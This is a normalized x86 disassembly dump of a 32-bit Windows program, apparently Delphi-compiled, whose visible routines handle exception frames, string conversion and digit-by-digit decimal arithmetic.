dec ebp
push esp
inc edx
arpl [ esi + edx * 2 + 0x61 ] sp
jb r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] 0x9d4c08b
add al 0x0
or [ ecx + 0x73 ] al
push ebx
adc [ eax ] al
lodsb [ esi ]
or eax 0xecc0048
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410a0003 ] al
jae r-xdata
mov eax ebx
call sub_4092bc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
xor eax eax
pop edx
pop ecx
or ecx [ ebp - 0x36cc0bab ]
insd
popad
insb
insb
dec ecx
outsb
je r-xdata
or al 0x48
add ah cl
or eax 0x10048
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
sub_480b78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_480bd8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax ebx
call sub_4092bc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480bdf
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_480c18
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
call sub_4838cc
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_480c4c
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
call sub_483570
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_480c80
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
add edx 0x4
call sub_4836a4
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_480cac
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
add edx 0x4
call sub_483860
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_480d04
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_480d4d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_483bfc
mov eax [ ebp - 0xc ]
call sub_409a48
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480d54
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
sub_480d5c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_480d9d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_483bfc
mov eax [ ebp - 0x4 ]
call sub_408544
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480da4
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_480dcc
push ebx
push esi
push edi
add esp 0xffffffdc
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_48142c
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_480df4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_480e54
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x28 ]
call sub_4099e8
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
call sub_48142c
lea esi [ ebp - 0x24 ]
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480e5b
lea eax [ ebp - 0x28 ]
call sub_403fa4
retn
sub_480e64
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x28 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_480ebe
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x28 ]
mov eax esi
call sub_408408
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
call sub_48142c
lea esi [ ebp - 0x24 ]
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480ec5
lea eax [ ebp - 0x28 ]
call sub_403fa4
retn
sub_480ef8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
lea edx [ edi + 0x4 ]
mov eax esi
mov ecx 0x22
call sub_4029c0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_480f40
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_480fe0
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0xc ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4099e8
mov eax [ ebp - 0x48 ]
lea edx [ ebp - 0x22 ]
call sub_48142c
mov ax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x22 ]
mov ecx esi
call sub_48314c
test al al
jne r-xdata
add esp 0xfffffff0
call sub_403578
lea ecx [ ebp - 0x44 ]
xor edx edx
mov eax edi
call sub_480ef8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480fe7
lea eax [ ebp - 0x4c ]
mov edx 0x2
call sub_403fc8
retn
lea edx [ ebp - 0x4c ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4c ]
call sub_480c00
sub_480fe7
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_481008
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x48 ] ebx
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_48108f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x22 ]
mov eax esi
call sub_48142c
mov ax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x22 ]
mov cx [ ebp + 0xc ]
call sub_48314c
test al al
jne r-xdata
add esp 0xfffffff0
call sub_403578
lea ecx [ ebp - 0x44 ]
xor edx edx
mov eax edi
call sub_480ef8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481096
lea eax [ ebp - 0x48 ]
call sub_403fa4
retn
lea edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x48 ]
call sub_480c00
sub_481096
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4810b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ ecx + 0x4 ]
mov ecx eax
xor edx edx
mov eax esi
call sub_480ef8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_481104
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48122e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415530
xor eax eax
push ebp
push sub_481211
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415540
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4155cc
test al al
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_415530
xor eax eax
push ebp
push sub_4811e4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x5
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41554c
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push 0x8
mov cx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_480f40
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_415538
retn
push 0x20
push 0x8
lea ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4155d8
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_481008
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481218
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415538
retn
sub_48123c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_481356
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
mov edx [ ebp - 0x4 ]
cmp ax [ edx + 0x4 ]
jne r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4150bc
mov eax esi
sub ax 0x8
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x8 ]
call sub_480cf0
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
call sub_4047fc
mov ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415580
jmp r-xdata
sub ax 0xf8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48135d
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0x18 ]
call sub_4046b0
retn
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x8 ]
call sub_480cf0
mov ecx [ ebp - 0x20 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415574
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_415530
xor eax eax
push ebp
push sub_48131f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x14 ] 0x5
mov eax [ ebx + 0x8 ]
add eax 0x4
call sub_481488
fstp [ ebp - 0xc ]
fwait
push esi
lea ecx [ ebp - 0x14 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41554c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_415538
retn
sub_481368
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ax [ ebx + 0x4 ]
mov [ edi ] ax
mov ecx [ esi + 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4810b8
mov [ edi + 0x8 ] eax
mov edx esi
mov eax ebx
call sub_415560
test al al
je r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_415540
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4813b4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x1
jb r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_480c40
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_480c74
jmp r-xdata
dec ebx
je r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_480c80
jmp r-xdata
dec ebx
je r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_480cac
jmp r-xdata
jmp r-xdata
call sub_415504
sub_48140c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_480cd8
mov edx [ ebp + 0x8 ]
mov [ edx ] al
pop esi
pop ebx
pop ebp
retn 0x4
sub_48142c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_48147a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_482cb0
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481481
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_480b78
sub_481488
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4814d0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_483bfc
mov eax [ ebp - 0xc ]
call sub_409a48
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4814d7
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
sub_4814e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4815fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_40418c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4045a8
mov edi eax
test di di
jne r-xdata
add si di
mov eax [ ebp - 0x4 ]
call sub_404264
mov edi eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_403ff8
cmp si di
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404264
movsx edx si
cmp eax edx
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404464
movsx edx si
dec edx
add eax edx
lea edx [ eax + 0x1 ]
cmp [ edx ] 0x35
jb r-xdata
test si si
jle r-xdata
mov dl [ eax ]
inc edx
mov [ eax ] dl
jmp r-xdata
cmp [ eax ] 0x39
jbe r-xdata
cmp [ eax ] 0x39
ja r-xdata
mov eax [ ebp - 0x8 ]
push eax
movsx ecx si
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4044c4
jmp r-xdata
mov [ eax ] 0x30
lea eax [ ebp - 0x10 ]
push eax
movsx ecx si
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4044c4
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4042b0
jmp r-xdata
cmp bl [ eax ]
je r-xdata
cmp bl [ eax ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481605
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc8
retn
dec esi
dec eax
cmp bl [ eax ]
je r-xdata
mov [ eax ] 0x30
mov dl [ eax ]
inc edx
mov [ eax ] dl
sub_481618
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403ff8
jmp r-xdata
mov eax [ ebx ]
call sub_404264
dec eax
jle r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
cmp [ eax ] 0x30
je r-xdata
push ebx
mov eax [ ebx ]
call sub_404264
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4044c4
sub_481654
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404454
mov eax [ ebp - 0x8 ]
call sub_404454
xor eax eax
push ebp
push sub_4816fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_481618
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_40403c
mov eax [ ebp - 0x4 ]
call sub_404264
mov ebx eax
mov eax [ ebp - 0x8 ]
call sub_404264
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x8 ]
call sub_404264
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404264
cmp ebx eax
jle r-xdata
mov ebx 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408130
mov ebx eax
or ebx 0xffffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481701
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fc8
retn
sub_481708
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_404454
mov eax [ ebp - 0x8 ]
call sub_404454
xor eax eax
push ebp
push sub_4818a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_481654
dec eax
jle r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x4 ]
call sub_403ff8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403ff8
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_403ff8
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_403ff8
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
mov eax [ ebp + 0xc ]
mov [ eax ] edi
jmp r-xdata
test esi esi
jle r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_40418c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov edx [ edx ]
call sub_4045a8
mov esi eax
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_40418c
mov eax [ ebp - 0x14 ]
mov edx [ ebp + 0x1c ]
mov edx [ edx ]
call sub_4045a8
mov edi eax
test esi esi
jne r-xdata
test edi edi
jle r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx ebx
call sub_40418c
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov eax [ eax ]
xor ecx ecx
call sub_40d0f0
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_403ff8
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
sub eax esi
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x10 ]
dec [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xffffff01
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4818a7
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_403fc8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x24 ]
mov edx ebx
call sub_40418c
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x1c ]
mov eax [ eax ]
xor ecx ecx
call sub_40d0f0
mov edx [ ebp - 0x20 ]
mov eax [ ebp + 0x1c ]
call sub_403ff8
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub eax edi
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov eax [ ebp + 0xc ]
dec [ eax ]
sub_4818b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x1 ] dl
mov esi [ ebp + 0x8 ]
mov ebx eax
sub bl 0x30
mov al [ ebp - 0x1 ]
sub al 0x30
add bl al
add bl [ edi ]
cmp bl 0x9
jbe r-xdata
mov eax esi
mov edx ebx
add dl 0x30
call sub_40418c
mov [ edi ] 0x0
mov eax esi
mov edx ebx
sub dl 0xa
add dl 0x30
call sub_40418c
mov [ edi ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax esi
mov edx r-xdata
call sub_403ff8
cmp [ esi ] 0x0
jne r-xdata
sub_481920
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov edi [ ebp + 0x8 ]
mov dl [ ebp - 0x1 ]
sub dl 0x30
add dl [ esi ]
mov ebx eax
sub bl 0x30
sub bl dl
cmp bl 0x9
jbe r-xdata
mov eax edi
mov edx ebx
add dl 0x30
call sub_40418c
mov [ esi ] 0x0
mov eax edi
mov edx ebx
add dl 0xa
add dl 0x30
call sub_40418c
mov [ esi ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_481970
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_481aa7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ff8
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_4043b0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481aae
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
mov edx ebx
call sub_403ff8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4043b0
jne r-xdata
mov [ ebp - 0x19 ] 0x0
mov eax ebx
call sub_404464
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_404464
mov [ ebp - 0x10 ] eax
mov eax ebx
call sub_404264
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_404264
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_42b20c
mov ebx eax
mov eax esi
call sub_403fa4
test ebx ebx
jle r-xdata
cmp [ ebp - 0x19 ] 0x0
jbe r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0x1
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042b0
mov [ ebp - 0x1a ] 0x30
mov edx [ ebp - 0xc ]
mov al [ edx + eax ]
mov [ ebp - 0x1a ] al
jmp r-xdata
mov [ ebp - 0x1b ] 0x30
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov al [ eax + edx ]
mov [ ebp - 0x1b ] al
jmp r-xdata
cmp ebx [ ebp - 0x14 ]
jg r-xdata
mov eax edi
sub eax ebx
mov edx [ ebp - 0x14 ]
sub edx ebx
mov [ ebp - 0x18 ] edx
cmp edi ebx
jl r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x19 ]
mov dl [ ebp - 0x1b ]
mov al [ ebp - 0x1a ]
call sub_4818b4
mov ecx [ esi ]
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4042b0
inc ebx
dec [ ebp - 0x20 ]
jne r-xdata
sub_481ad0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_481cae
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
call sub_481654
test eax eax
jl r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_40403c
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_40403c
mov eax esi
mov edx r-xdata
call sub_403ff8
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40403c
lea eax [ ebp - 0xc ]
mov edx edi
call sub_40403c
mov eax esi
call sub_403fa4
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_403ff8
mov eax esi
mov ecx [ ebp - 0xc ]
mov edx r-xdata
call sub_4042b0
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043b0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043b0
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043b0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043b0
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_403ff8
jmp r-xdata
mov [ ebp - 0x1d ] 0x0
mov eax [ ebp - 0x8 ]
call sub_404464
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
call sub_404464
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
call sub_404264
mov edi eax
mov eax [ ebp - 0xc ]
call sub_404264
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_42b20c
mov ebx eax
mov eax esi
call sub_403fa4
test ebx ebx
jle r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_403ff8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481cb5
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fc8
retn
cmp [ esi ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov ebx 0x1
mov eax esi
mov edx r-xdata
call sub_403ff8
mov [ ebp - 0x1e ] 0x30
mov edx [ ebp - 0x10 ]
mov al [ edx + eax ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov [ ebp - 0x1f ] 0x30
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov al [ eax + edx ]
mov [ ebp - 0x1f ] al
jmp r-xdata
cmp ebx [ ebp - 0x18 ]
jg r-xdata
mov eax edi
sub eax ebx
mov edx [ ebp - 0x18 ]
sub edx ebx
mov [ ebp - 0x1c ] edx
cmp edi ebx
jl r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x1d ]
mov dl [ ebp - 0x1f ]
mov al [ ebp - 0x1e ]
call sub_481920
mov ecx [ esi ]
